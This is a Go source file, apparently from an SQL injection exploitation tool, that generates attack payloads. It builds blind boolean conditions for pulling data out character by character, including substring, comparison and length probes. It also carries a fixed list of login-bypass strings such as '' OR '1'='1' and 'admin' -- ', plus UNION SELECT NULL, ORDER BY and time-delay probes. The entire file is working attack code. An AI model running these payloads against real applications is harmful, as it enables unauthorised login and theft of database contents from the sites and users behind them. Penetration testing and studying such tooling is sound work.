package payloads

import (
	"strconv"
	"strings"
)

type SQLi struct {
	Dialect Dialect
	Expr    string
	From    string
	Where   string
	Prefix  string
	Suffix  string
}

func (q SQLi) target() string {
	if q.From == "" {
		return "(" + q.Expr + ")"
	}
	s := "SELECT " + q.Expr + " FROM " + q.From
	if q.Where != "" {
		s += " WHERE " + q.Where
	}
	return "(" + s + ")"
}

func (q SQLi) wrap(cond string) string {
	return q.Prefix + cond + q.Suffix
}

func (q SQLi) Char(pos int) string {
	return q.Dialect.CharCode(q.Dialect.Substring(q.target(), pos, 1))
}

func (q SQLi) Equal(pos int, c byte) string {
	return q.wrap(q.Dialect.Substring(q.target(), pos, 1) + "=" + quoteChar(c))
}

func (q SQLi) Greater(pos, value int) string {
	return q.wrap(q.Char(pos) + ">" + strconv.Itoa(value))
}

func (q SQLi) Less(pos, value int) string {
	return q.wrap(q.Char(pos) + "<" + strconv.Itoa(value))
}

func (q SQLi) Length() string {
	return q.Dialect.Length(q.target())
}

func (q SQLi) LengthEquals(n int) string {
	return q.wrap(q.Dialect.Length(q.target()) + "=" + strconv.Itoa(n))
}

func (q SQLi) LengthGreater(n int) string {
	return q.wrap(q.Dialect.Length(q.target()) + ">" + strconv.Itoa(n))
}

func AuthBypass() []string {
	return []string{
		"' OR '1'='1",
		"' OR '1'='1' -- ",
		"' OR '1'='1' #",
		"' OR 1=1 -- ",
		"') OR ('1'='1",
		"') OR ('1'='1' -- ",
		"\" OR \"1\"=\"1",
		"\" OR 1=1 -- ",
		"admin' -- ",
		"admin' #",
		"admin'/*",
		"admin') -- ",
		"' OR 1=1 LIMIT 1 -- ",
		"or 1=1",
		"' OR ''='",
	}
}

func UnionNull(columns int) string {
	nulls := make([]string, columns)
	for i := range nulls {
		nulls[i] = "NULL"
	}
	return " UNION SELECT " + strings.Join(nulls, ",") + "-- "
}

func OrderBy(n int) string {
	return " ORDER BY " + strconv.Itoa(n) + "-- "
}

func TimeDelay(d Dialect, seconds int) string {
	return d.Sleep(seconds)
}
